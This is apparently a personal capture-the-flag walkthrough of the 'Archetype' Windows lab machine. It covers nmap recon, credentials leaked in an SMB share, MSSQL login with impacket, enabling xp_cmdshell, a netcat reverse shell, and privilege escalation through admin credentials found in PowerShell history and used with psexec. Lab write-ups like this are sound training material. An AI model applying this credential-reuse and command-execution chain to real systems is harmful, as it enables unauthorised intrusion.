# Archetype    Windows    Easy    04-04-26


## 0. Machine Info
Name        :  Archetype
OS          : Windows
Difficulty  : Easy
Pwned Date  : 04-04-26
Status      : Starting Point
Tags        : SMB, MSSQL

## 1. Recon


### 1.1 Nmap
# Initial fast scan
nmap -Pn -sS -sV -sC 10.xx.xx.xx

Nmap scan report for 10.xx.xx.xx

Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.xx.xx.xx:1433: 
|     Target_Name: ARCHETYPE
|     NetBIOS_Domain_Name: ARCHETYPE
|     NetBIOS_Computer_Name: ARCHETYPE
|     DNS_Domain_Name: Archetype
|     DNS_Computer_Name: Archetype
|_    Product_Version: 10.0.17763
|_ssl-date: 2026-04-01T14:42:31+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-04-01T14:40:00
|_Not valid after:  2056-04-01T14:40:00
| ms-sql-info: 
|   10.xx.xx.xx:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-04-01T07:42:23-07:00
| smb2-time: 
|   date: 2026-04-01T14:42:20
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h24m00s, deviation: 3h07m52s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.41 seconds




### 1.2 Service Enum

PORT 139/tcp
  └── smb
  └── listed shares
  └── found non-admin share 'backups'
  └── 'backups' has 'prod.dtsConfig'
  └── Things to notice: Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;
  
PORT 1433/tcp 
  └── Impacket... examples... mssqlclient.py
      to establish authed connection to MSSQL Server
      run the tool---continued in exploitation
  
  
  
  # Commands smb
$ smbclient -L 10.xx.xx.xx 
Password for [WORKGROUP\ *****]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC

  
$ smbclient \\\\10.xx.xx.xx\\backups
Password for [WORKGROUP\tsfahmd01]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 20 17:50:57 2020
  ..                                  D        0  Mon Jan 20 17:50:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 17:53:02 2020

                5056511 blocks of size 4096. 2617453 blocks available
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)


$ cat prod.dtsConfig
  <DTSConfiguration>
    <DTSConfigurationHeadi10.ng>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration> 


  # Commands mssql
  $ impacket-mssqlclient ARCHETYPE/sql_svc@10.129.95.187 -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)>

#### 1.2.1 Creds
HOST: ARCHETYPE
sql_svc: M3g4c0rp123

## 2. Exploitation


### 2.1 Foothold
Vulnerability : exposed creds
Vector        : login into mssql via impacket-mssqlclient 'sql_svc:M3g4c0rp123', execute binary to get shell

Steps:
1. Find exposed creds in non-admin smb share
2. use creds to login va impacket
3. set-up listener execute binary

Key command(s):
  $ impacket-mssqlclient ARCHETYPE/sql_svc@10.xx.xx.xx -windows-auth
  # ..................... ^domain^/username  ^^^ip^^^

Shell obtained:
  Type  : MSSQL Interactive Shell... Reverse shell
  User  : sql_svc
  Method: nc 


## 3. Post-Exploitation


### 3.1 Local Enum
xp_cmdshell usage blocked
# steps to unblock
> EXEC sp_configure 'show advanced options', 1;
> EXEC sp_configure 'xp_cmdshell', 1;

whoami                 sql_svc
hostname               archetype



### 3.2 Privesc
Vector  : exposed creds
Tool    : WinPEAS

C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
'administrator:MEGACORP_4dm1n!!'

access via impacket-psexec

Steps:
1. run winpeas
2. get exposed creds
3. access

Key command:
  impacket-psexec administrator@10.xx.xx.xx

Result: root shell obtained

## 4. Flags

Path to user flag : C:\Users\sql_svc\Desktop\user.txt
Path to root flag : C:\Users\Administrator\Desktop\root.txt

## 5. Lessons Learned
What tripped me up:
-  Belirved interactive shell to be the foothold
-  Difference
   
| Feature                       | xp_cmdshell | Reverse Shell |
| Persistent session            |     ❌      |      ✅       |
| Stateful navigation           |     ❌      |      ✅       |
| Interactive programs          |     ❌      |      ✅       |
| File uploads/transfers        |   Awkward   |     Easy      |
| Privesc tools (winpeas etc.)  |   Painful   |    Natural    |
| Tab completion, history       |     ❌      |      ✅       |



New tool/technique learned:
-  impacket

Would do differently next time:
- Do not settle for anything less than reverse or bind shell

## 6. Rabbit Holes
Dead End              : Assumed interactive shell to be foothold

Time wasted           : So much

Why it didn't work    : 
xp_cmdshell IS a shell, but it's a blind/non-interactive one-shot executor. Each xp_cmdshell call:
• Runs the command
• Returns stdout as rows
• Then dies, no state persists

How I realized      : Official write-up

Impacket
Colection of python classes (scripts & libraries), that provide low level programatic acces to simple network protocols
github: https://github.com/fortra/impacket

